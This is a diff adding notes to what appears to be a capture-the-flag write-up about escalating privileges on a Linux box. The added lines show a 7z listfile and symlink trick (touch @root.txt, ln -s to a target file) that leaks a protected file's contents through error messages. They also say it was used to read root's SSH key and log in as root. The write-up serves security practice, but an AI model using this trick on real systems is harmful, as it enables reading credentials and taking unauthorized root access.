@@ -174,4 +174,15 @@ usage_management: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynam
 
 
 - No overflow found at the start
-- 
+
+Turns out there is a trick to this, which i found in hacktricks, consisting of using the following commands 
+
+```bash
+cd /path/to/7z/acting/folder
+touch @root.txt
+ln -s /file/you/want/to/read root.txt
+```
+
+It will dump in an error the contents of of a file in several messages.
+
+In this case it was adapted to read the .ssh file and get a root login, thus we are now [[root]]
